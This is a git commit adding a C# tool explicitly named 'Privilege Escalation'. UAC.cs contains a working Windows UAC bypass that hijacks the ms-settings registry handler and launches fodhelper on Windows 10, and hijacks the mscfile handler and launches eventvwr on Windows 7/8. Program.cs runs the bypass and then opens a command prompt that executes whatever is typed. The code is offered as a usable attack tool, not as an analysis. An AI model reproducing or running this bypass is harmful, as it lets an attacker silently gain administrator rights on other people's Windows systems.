4a38498e7934c3b8855b129d4145b3491adc6e43
Tesla <43712252+DecodeMehh@users.noreply.github.com>
2020-02-11 07:50:57 +0100

    Add files via upload
    initial commit

---
+++ Privilege_Escalation/Privilege Escalation/Program.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Diagnostics;
+
+namespace Privilege_Escalation
+{
+    /// <summary>
+    ///     This project has been made by Tesla Night for Mrakovic-ORG
+    /// </summary>
+    internal static class Program
+    {
+        private static void Main()
+        {
+            Console.Clear();
+            Console.Title = "Privilege Escalation";
+
+            //This part will return if current process is elevated
+            var isUAC = UAC.IsRunningAsLocalAdmin() ? "Yes" : "No";
+            Console.WriteLine("UAC: " + isUAC);
+
+            //If isn't already elevated start the bypass
+            if (!UAC.IsRunningAsLocalAdmin()) UAC.Start();
+
+            //Quickly done a remote shell, sorry for garbage code :p
+            Console.WriteLine("Press enter to start a Remote Shell !");
+            while (Console.ReadKey().Key == ConsoleKey.Enter) RemoteShell();
+        }
+
+        private static void RemoteShell()
+        {
+            Console.WriteLine("Shell: ");
+            var input = Console.ReadLine();
+            if (input != null) Process.Start(input);
+
+            Main();
+        }
+    }
+}
---
+++ Privilege_Escalation/Privilege Escalation/UAC.cs
@@ -0,0 +1,107 @@
+﻿using System;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using Microsoft.Win32;
+
+namespace Privilege_Escalation
+{
+    public static class UAC
+    {
+        /// <summary>
+        ///     Start UAC Bypass
+        /// </summary>
+        public static void Start()
+        {
+            var osName =
+                Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "")
+                    .ToString();
+            Console.WriteLine("Using: " + osName);
+            if (!IsRunningAsLocalAdmin())
+            {
+                if (osName.StartsWith("Windows 10"))
+                    Windows10();
+                else if (osName.StartsWith("Windows 7"))
+                    Windows7();
+                else if (osName.StartsWith("Windows 8"))
+                    Windows7();
+                else
+                    Compatibility();
+            }
+        }
+
+        private static void Compatibility()
+        {
+            Console.WriteLine(
+                "\nYour OS might not be compatible.\nAre you willing to try exploit anyway?\n\nNumpad 1: Windows 7\nNumpad 2: Windows 10");
+            if (Console.ReadKey().Key == ConsoleKey.NumPad1)
+                Windows7();
+            else
+                Windows10();
+        }
+
+        private static void Windows10()
+        {
+            var wow64Value = IntPtr.Zero;
+            Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
+            Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true)
+                ?.SetValue("", Assembly.GetExecutingAssembly().Location);
+            Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true)
+                ?.SetValue("DelegateExecute", "");
+            Wow64Interop.DisableWow64FSRedirection(ref wow64Value);
+            try
+            {
+                Process.Start("fodhelper");
+            }
+            catch
+            {
+                Console.WriteLine("Please make sure you removed prefer 32-bits.");
+            }
+            finally
+            {
+                Wow64Interop.Wow64RevertWow64FsRedirection(wow64Value);
+                Environment.Exit(0);
+            }
+        }
+
+        private static void Windows7()
+        {
+            Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
+            Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true)
+                ?.SetValue
+                    ("", Assembly.GetExecutingAssembly().Location);
+            Process.Start("eventvwr");
+            Environment.Exit(0);
+        }
+
+        /// <summary>
+        ///     Check if application is running as admin
+        /// </summary>
+        public static bool IsRunningAsLocalAdmin()
+        {
+            var cur = WindowsIdentity.GetCurrent();
+            if (cur.Groups != null)
+                foreach (var role in cur.Groups)
+                    if (role.IsValidTargetType(typeof(SecurityIdentifier)))
+                    {
+                        var sid = (SecurityIdentifier) role.Translate(typeof(SecurityIdentifier));
+                        if (sid.IsWellKnown(WellKnownSidType.AccountAdministratorSid) ||
+                            sid.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) return true;
+                    }
+
+            return false;
+        }
+
+        private static class Wow64Interop
+        {
+            private const string Kernel32dll = "Kernel32.Dll";
+
+            [DllImport(Kernel32dll, EntryPoint = "Wow64DisableWow64FsRedirection")]
+            public static extern bool DisableWow64FSRedirection(ref IntPtr ptr);
+
+            [DllImport(Kernel32dll, EntryPoint = "Wow64RevertWow64FsRedirection")]
+            public static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);
+        }
+    }
+}
